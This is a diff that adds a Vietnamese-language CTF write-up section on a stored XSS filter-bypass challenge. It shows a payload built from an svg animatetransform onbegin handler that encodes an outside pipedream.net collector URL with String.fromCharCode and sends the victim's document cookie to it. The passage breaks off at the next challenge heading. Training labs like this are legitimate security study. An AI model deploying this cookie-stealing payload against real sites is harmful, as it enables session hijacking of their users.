@@ -6,6 +6,7 @@
 * [Chall 3: JSON Web Token (JWT) - Public key](#chall-3-json-web-token-jwt---public-key) 
 * [Chall 4: CSRF - 0 protection](#chall-4-csrf---0-protection)
 * [Chall 5: CSRF - token bypass](#chall-5-csrf---token-bypass)
+* [Chall 6: XSS
 
 <hr>
 
@@ -245,4 +246,38 @@ Activate your account to access intranet.
 
 ```
 
+## Chall 6: XSS - Stored - filter bypass
 
+```
+There are protections in place
+Statement
+Steal the administrator’s session cookie.
+
+```
+> Reference: https://hackmd.io/@devme4f/SJY9JKpFc#XSS---Stored---filter-bypass
+
+## Bài này mình tấn công xss luôn vào message, nhưng thử thì bị filter khá nhiều, ' ', " ", alert( , document. , <script>,..... Sau 1 hồi dùng burpsuite 
+intruder với từng tag và attribute trong **https://portswigger.net/web-security/cross-site-scripting/cheat-sheet** thì mình thu được thẻ tag svg với attribute 
+là animatetransform và onbegin dùng để kích hoạt 1 hoạt động cụ thể, vì alert( bị filter nên ở đây ta thử thay bằng print() xem sao:
+
+> payload: <svg><animatetransform onbegin=print()>
+
+![image](https://user-images.githubusercontent.com/104350480/220233708-c838dfb4-b486-4952-b69f-6441a2d91b67.png)
+
+Vậy là thực thi thành công, tiếp theo đến phần chuyển trang với document.cookie, vì document.cookie đã bị chuyển trang nên ta có thể tận dụng 1 cách khác
+để lấy cookie ở đây là document['cookie'] cũng tương tự như trên:
+Ý tưởng payload sẽ là: dùng pipedream để tạo đường dẫn chuyển trang xong dùng concat để nối document['cookie'] vào như này: 
+> location='https://eo7xxasp6lhfvaj.m.pipedream.nethttps://eo7xxasp6lhfvaj.m.pipedream.net/?c='.concat(document['cookie'])
+Nhưng như đã nói ở trên ' ' và " " đề bị lọc nên kh thể thực hiện trực tiếp như trên được, nhưng để ý nó đều ở dạng string thì ta có thể thay thế nó 
+bằng cách tận dụng String.fromCharCode để khai thác. Payload như sau:
+> <svg><animatetransform onbegin=(location=(String.fromCharCode(104,116,116,112,115,58,47,47,101,111,55,120,120,97,115,112,54,108,104,102,118,97,106,46,109,46,112,105,112,101,100,114,101,97,109,46,110,101,116,47,63,99,61).concat(document[String.fromCharCode(99,111,111,107,105,101)])))>
+
+Thực hiện chuyển trang thành công:
+
+![image](https://user-images.githubusercontent.com/104350480/220234419-b55beced-4d13-479c-8eef-e3e3d831f87a.png)
+
+Và cookie được trả về: 
+
+![image](https://user-images.githubusercontent.com/104350480/220234492-e1e8b068-1017-4add-abff-eaf54a90185f.png)
+
+## Chall 7: 
